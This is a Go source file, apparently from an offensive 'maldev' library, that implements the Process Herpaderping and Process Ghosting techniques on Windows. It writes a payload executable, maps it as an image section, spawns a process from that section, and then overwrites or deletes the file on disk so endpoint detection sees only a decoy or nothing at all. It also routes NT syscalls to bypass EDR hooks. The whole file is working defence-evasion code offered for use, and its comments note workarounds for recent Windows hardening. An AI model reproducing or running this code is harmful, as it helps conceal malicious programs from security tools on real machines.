//go:build windows

package herpaderping

import (
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/stealthopen"
	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Windows constants not in x/sys/windows.
const (
	secImage                    = 0x01000000
	sectionAllAccess            = 0x000F001F
	processBasicInformation     = 0
	rtlUserProcParamsNormalized = 0x01

	// fileDispositionInformationExClass is the FILE_INFORMATION_CLASS value
	// for NtSetInformationFile. Distinct from the FILE_INFO_BY_HANDLE_CLASS
	// value (21) used by SetFileInformationByHandle.
	fileDispositionInformationExClass = uintptr(64)
)

// Mode selects between the two image-section process creation variants.
type Mode int

const (
	// ModeHerpaderping (default) writes the payload, creates the section,
	// then overwrites the disk file with decoy content before NtCreateThreadEx.
	// EDR callbacks fire against the decoy, not the payload.
	// Note: NtCreateProcessEx is hardened on Win11 24H2 for this pattern;
	// use ModeGhosting on that build.
	ModeHerpaderping Mode = iota

	// ModeGhosting marks the target file delete-pending before NtCreateSection
	// so the file is gone from disk by the time NtCreateProcessEx runs.
	// Bypasses the Win11 24H2 image-load notify validation that blocks
	// ModeHerpaderping, and leaves no file artefact on disk at all.
	ModeGhosting
)

// Config controls herpaderping/ghosting execution.
type Config struct {
	// Mode selects the technique variant. Default (zero) is ModeHerpaderping.
	// Use ModeGhosting on Win11 24H2 or when no disk artefact is acceptable.
	Mode Mode

	// PayloadPath is the path to the PE to execute stealthily.
	PayloadPath string

	// TargetPath is the path where the PE will be written temporarily.
	// Herpaderping: overwritten with DecoyPath content before thread creation.
	// Ghosting: marked delete-pending and removed from disk before NtCreateProcessEx.
	// If empty, a temp file is used.
	TargetPath string

	// DecoyPath is the path to a legitimate PE used to overwrite the target
	// (ModeHerpaderping only). If empty, random bytes are used. Ignored in
	// ModeGhosting.
	DecoyPath string

	// Caller routes NT syscalls through direct/indirect methods to bypass
	// EDR hooks on NtCreateSection, NtCreateProcessEx, NtCreateThreadEx, etc.
	// nil = standard WinAPI (LazyProc.Call).
	Caller *wsyscall.Caller

	// Opener routes the payload + decoy reads through a stealth strategy
	// (typically *stealthopen.Stealth built for PayloadPath/DecoyPath) so
	// path-based EDR file hooks never observe the open. nil = standard
	// os.Open path read. The target-file create (CREATE_ALWAYS write) is
	// unchanged — the opener is a read-only abstraction.
	Opener stealthopen.Opener
}

// ntCall routes a call through the Caller if set, otherwise via api.ProcXxx.Call.
func ntCall(caller *wsyscall.Caller, name string, proc *windows.LazyProc, args ...uintptr) (uintptr, error) {
	if caller != nil {
		return caller.Call(name, args...)
	}
	r, _, _ := proc.Call(args...)
	if r != 0 {
		return r, fmt.Errorf("%s: NTSTATUS 0x%08X", name, uint32(r))
	}
	return 0, nil
}

// ioStatusBlock mirrors IO_STATUS_BLOCK (x64: Status uint32 + 4 pad + Information uintptr).
type ioStatusBlock struct {
	Status      uint32
	_           [4]byte
	Information uintptr
}

// processBasicInfo mirrors PROCESS_BASIC_INFORMATION.
type processBasicInfo struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	_                            [4]byte // padding on x64
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

// unicodeString mirrors UNICODE_STRING.
type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	_             [4]byte // padding on x64
	Buffer        uintptr
}

// rtlUserProcessParameters mirrors a minimal RTL_USER_PROCESS_PARAMETERS.
type rtlUserProcessParameters struct {
	MaximumLength  uint32
	Length         uint32
	Flags          uint32
	DebugFlags     uint32
	ConsoleHandle  uintptr
	ConsoleFlags   uint32
	_              [4]byte
	StandardInput  uintptr
	StandardOutput uintptr
	StandardError  uintptr
	CurrentDirectory struct {
		DosPath unicodeString
		Handle  uintptr
	}
	DllPath       unicodeString
	ImagePathName unicodeString
	CommandLine   unicodeString
}

// ghostMarkDeletePending marks hFile for POSIX deletion via NtSetInformationFile.
//
// With FILE_DISPOSITION_DELETE|FILE_DISPOSITION_POSIX_SEMANTICS the kernel
// unlinks the name from the directory immediately (not deferred to last-handle-
// close), while the file object stays alive for all current open handles —
// including the hFile we pass to NtCreateSection next. Closing hFile after
// NtCreateSection completes the deletion; the section retains its own reference
// to the file object so the image pages are not freed until the process exits.
func ghostMarkDeletePending(hFile windows.Handle, caller *wsyscall.Caller) error {
	type fileDispositionInfoEx struct {
		Flags uint32
	}
	info := fileDispositionInfoEx{
		Flags: windows.FILE_DISPOSITION_DELETE | windows.FILE_DISPOSITION_POSIX_SEMANTICS,
	}
	var iosb ioStatusBlock
	r, err := ntCall(caller, "NtSetInformationFile", api.ProcNtSetInformationFile,
		uintptr(hFile),
		uintptr(unsafe.Pointer(&iosb)),
		uintptr(unsafe.Pointer(&info)),
		uintptr(unsafe.Sizeof(info)),
		fileDispositionInformationExClass,
	)
	if r != 0 {
		return fmt.Errorf("NtSetInformationFile: %w", err)
	}
	return nil
}

// Run executes a PE using the Process Herpaderping or Process Ghosting technique,
// selected by cfg.Mode. Both exploit NtCreateSection(SEC_IMAGE) image caching so
// the running process executes the original payload from kernel memory while the
// on-disk file shows no trace of it.
//
// ModeHerpaderping (default):
//  1. Write payload to TargetPath
//  2. NtCreateSection — caches payload image in kernel
//  3. NtCreateProcessEx — process object from section
//  4. Overwrite TargetPath with DecoyPath (or random bytes)
//  5. NtCreateThreadEx — EDR callbacks fire; disk shows the decoy
//
// ModeGhosting:
//  1. Write payload to TargetPath
//  2. NtSetInformationFile — mark delete-pending (POSIX); name removed from disk
//  3. NtCreateSection — section from still-open (but nameless) file
//  4. CloseHandle(hFile) — file data freed from disk; section retains kernel ref
//  5. NtCreateProcessEx — process from section; no backing file exists
//  6. NtCreateThreadEx — EDR callbacks see no file artefact at all
func Run(cfg Config) error {
	// Read payload (via Opener — stealth or standard)
	payload, err := stealthopen.OpenRead(cfg.Opener, cfg.PayloadPath)
	if err != nil {
		return fmt.Errorf("read payload: %w", err)
	}

	// Determine target path
	targetPath := cfg.TargetPath
	if targetPath == "" {
		tmp, tmpErr := os.CreateTemp("", "*.exe")
		if tmpErr != nil {
			return fmt.Errorf("create temp: %w", tmpErr)
		}
		targetPath = tmp.Name()
		tmp.Close()
	}

	targetPathW, err := windows.UTF16PtrFromString(targetPath)
	if err != nil {
		return fmt.Errorf("utf16 target: %w", err)
	}

	// Ghosting needs DELETE access to call NtSetInformationFile, and
	// FILE_SHARE_DELETE so the delete-pending flag coexists with the
	// section creation on the same handle.
	accessMask := uint32(windows.GENERIC_READ | windows.GENERIC_WRITE)
	shareMode := uint32(windows.FILE_SHARE_READ)
	if cfg.Mode == ModeGhosting {
		accessMask |= windows.DELETE
		shareMode |= windows.FILE_SHARE_DELETE
	}

	hFile, err := windows.CreateFile(
		targetPathW,
		accessMask,
		shareMode,
		nil,
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return fmt.Errorf("create target file: %w", err)
	}
	autoTemp := cfg.TargetPath == ""
	succeeded := false
	hFileClosed := false
	defer func() {
		if !hFileClosed {
			windows.CloseHandle(hFile)
		}
		// Only delete on failure — on success, herpaderping leaves the decoy
		// on disk intentionally; ghosting already removed the file.
		if !succeeded && autoTemp {
			os.Remove(targetPath)
		}
	}()

	// Ghosting step: per Landau's canonical sequence, mark delete-pending
	// BEFORE writing the payload. Win11 25H2 (build 26200) appears to track
	// the section's backing-file lifecycle and rejects NtCreateProcessEx if
	// the file was ever fully realized on disk before the section creation;
	// marking delete-pending on an empty file ensures the file is never
	// "real" from the kernel's perspective at any point in its lifetime.
	if cfg.Mode == ModeGhosting {
		if err := ghostMarkDeletePending(hFile, cfg.Caller); err != nil {
			return fmt.Errorf("mark delete-pending: %w", err)
		}
	}

	var written uint32
	if err := windows.WriteFile(hFile, payload, &written, nil); err != nil {
		return fmt.Errorf("write payload: %w", err)
	}

	// Create image section from the file.
	var hSection windows.Handle
	r, err := ntCall(cfg.Caller, "NtCreateSection", api.ProcNtCreateSection,
		uintptr(unsafe.Pointer(&hSection)),
		sectionAllAccess,
		0, // no object attributes
		0, // max size = file size
		windows.PAGE_READONLY,
		secImage,
		uintptr(hFile),
	)
	if r != 0 {
		return fmt.Errorf("NtCreateSection: %w", err)
	}
	defer windows.CloseHandle(hSection)

	// Ghosting step: close file handle — this completes the physical deletion.
	// The section retains its own reference to the file object so the image
	// pages remain valid until the section is released.
	if cfg.Mode == ModeGhosting {
		windows.CloseHandle(hFile)
		hFileClosed = true
	}

	// Create process from the section.
	var hProcess windows.Handle
	r, err = ntCall(cfg.Caller, "NtCreateProcessEx", api.ProcNtCreateProcessEx,
		uintptr(unsafe.Pointer(&hProcess)),
		windows.PROCESS_ALL_ACCESS,
		0, // no object attributes
		uintptr(windows.CurrentProcess()),
		0, // flags
		uintptr(hSection),
		0, // no debug port
		0, // no exception port
		0, // don't inherit handles
	)
	if r != 0 {
		return fmt.Errorf("NtCreateProcessEx: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	// Herpaderping step: overwrite the file on disk with decoy content.
	if cfg.Mode == ModeHerpaderping {
		windows.SetFilePointer(hFile, 0, nil, 0)

		var decoyData []byte
		if cfg.DecoyPath != "" {
			decoyData, err = stealthopen.OpenRead(cfg.Opener, cfg.DecoyPath)
			if err != nil {
				return fmt.Errorf("read decoy: %w", err)
			}
		} else {
			decoyData = make([]byte, len(payload))
			if _, err := io.ReadFull(rand.Reader, decoyData); err != nil {
				return fmt.Errorf("generate random decoy: %w", err)
			}
		}

		if err := windows.WriteFile(hFile, decoyData, &written, nil); err != nil {
			return fmt.Errorf("write decoy: %w", err)
		}
		// Flush to ensure disk is updated before thread creation.
		windows.FlushFileBuffers(hFile)
	}

	// Set up process parameters.
	if err := setupProcessParameters(hProcess, targetPath, cfg.Caller); err != nil {
		return fmt.Errorf("setup params: %w", err)
	}

	// Get the entry point and create the initial thread.
	entryPoint, err := getEntryPoint(hProcess, payload, cfg.Caller)
	if err != nil {
		return fmt.Errorf("get entry point: %w", err)
	}

	var hThread windows.Handle
	r, err = ntCall(cfg.Caller, "NtCreateThreadEx", api.ProcNtCreateThreadEx,
		uintptr(unsafe.Pointer(&hThread)),
		api.ThreadAllAccess,
		0,
		uintptr(hProcess),
		entryPoint,
		0, // no argument
		0, // not suspended
		0, 0, 0, 0,
	)
	if r != 0 {
		return fmt.Errorf("NtCreateThreadEx: %w", err)
	}
	windows.CloseHandle(hThread)

	succeeded = true
	return nil
}

// setupProcessParameters creates RTL_USER_PROCESS_PARAMETERS and writes
// them to the target process PEB.
func setupProcessParameters(hProcess windows.Handle, imagePath string, caller *wsyscall.Caller) error {
	imagePathW, err := windows.UTF16PtrFromString(imagePath)
	if err != nil {
		return fmt.Errorf("utf16 image path: %w", err)
	}

	// Initialize UNICODE_STRING for the image path
	var imagePathUS unicodeString
	api.ProcRtlInitUnicodeString.Call(
		uintptr(unsafe.Pointer(&imagePathUS)),
		uintptr(unsafe.Pointer(imagePathW)),
	)

	// Create process parameters
	var pParams uintptr
	r, _, _ := api.ProcRtlCreateProcessParametersEx.Call(
		uintptr(unsafe.Pointer(&pParams)),
		uintptr(unsafe.Pointer(&imagePathUS)), // ImagePathName
		0, // DllPath
		0, // CurrentDirectory
		uintptr(unsafe.Pointer(&imagePathUS)), // CommandLine = image path
		0, // Environment
		0, // WindowTitle
		0, // DesktopInfo
		0, // ShellInfo
		0, // RuntimeData
		rtlUserProcParamsNormalized,
	)
	if r != 0 {
		return fmt.Errorf("RtlCreateProcessParametersEx: NTSTATUS 0x%08X", uint32(r))
	}

	// Get PEB address from target process
	var pbi processBasicInfo
	var retLen uint32
	r, err = ntCall(caller, "NtQueryInformationProcess", api.ProcNtQueryInformationProcess,
		uintptr(hProcess),
		processBasicInformation,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 {
		return fmt.Errorf("NtQueryInformationProcess: %w", err)
	}

	// ProcessParameters pointer offset in PEB (offset 0x20 on x64)
	paramsPtrAddr := pbi.PebBaseAddress + 0x20

	// Get the size of the parameters
	params := (*rtlUserProcessParameters)(unsafe.Pointer(pParams))
	paramsSize := uintptr(params.MaximumLength)

	// Allocate memory in target process for the parameters
	var remoteParams uintptr
	r, err = ntCall(caller, "NtAllocateVirtualMemory", api.ProcNtAllocateVirtualMemory,
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&remoteParams)),
		0,
		uintptr(unsafe.Pointer(&paramsSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if r != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory (params): %w", err)
	}

	// Write parameters to remote process
	var bytesWritten uintptr
	if err := windows.WriteProcessMemory(
		hProcess,
		remoteParams,
		(*byte)(unsafe.Pointer(pParams)),
		paramsSize,
		&bytesWritten,
	); err != nil {
		return fmt.Errorf("WriteProcessMemory (params): %w", err)
	}

	// Update PEB.ProcessParameters pointer to point to remote allocation
	if err := windows.WriteProcessMemory(
		hProcess,
		paramsPtrAddr,
		(*byte)(unsafe.Pointer(&remoteParams)),
		unsafe.Sizeof(remoteParams),
		&bytesWritten,
	); err != nil {
		return fmt.Errorf("WriteProcessMemory (PEB): %w", err)
	}

	return nil
}

// getEntryPoint reads the PE headers from the payload to find the entry point,
// then adds the process image base to get the absolute address.
func getEntryPoint(hProcess windows.Handle, payload []byte, caller *wsyscall.Caller) (uintptr, error) {
	// Get the image base from the process PEB
	var pbi processBasicInfo
	var retLen uint32
	r, err := ntCall(caller, "NtQueryInformationProcess", api.ProcNtQueryInformationProcess,
		uintptr(hProcess),
		processBasicInformation,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess: %w", err)
	}

	// Read ImageBaseAddress from PEB (offset 0x10 on x64)
	imageBaseAddr := pbi.PebBaseAddress + 0x10
	var imageBase uintptr
	var bytesRead uintptr
	if err := windows.ReadProcessMemory(
		hProcess,
		imageBaseAddr,
		(*byte)(unsafe.Pointer(&imageBase)),
		unsafe.Sizeof(imageBase),
		&bytesRead,
	); err != nil {
		return 0, fmt.Errorf("ReadProcessMemory (image base): %w", err)
	}

	// Parse PE headers from the payload bytes to get AddressOfEntryPoint
	if len(payload) < 64 {
		return 0, fmt.Errorf("payload too small for PE header")
	}
	eLfanew := *(*int32)(unsafe.Pointer(&payload[0x3C]))
	if int(eLfanew)+4+20+16+4 > len(payload) {
		return 0, fmt.Errorf("invalid PE header offset")
	}
	// PE signature at e_lfanew, then COFF header (20 bytes), then optional header.
	// AddressOfEntryPoint is at offset 16 in the optional header.
	optionalHeaderOffset := int(eLfanew) + 4 + 20 // PE sig(4) + COFF(20)
	addressOfEntryPoint := *(*uint32)(unsafe.Pointer(&payload[optionalHeaderOffset+16]))

	return imageBase + uintptr(addressOfEntryPoint), nil
}
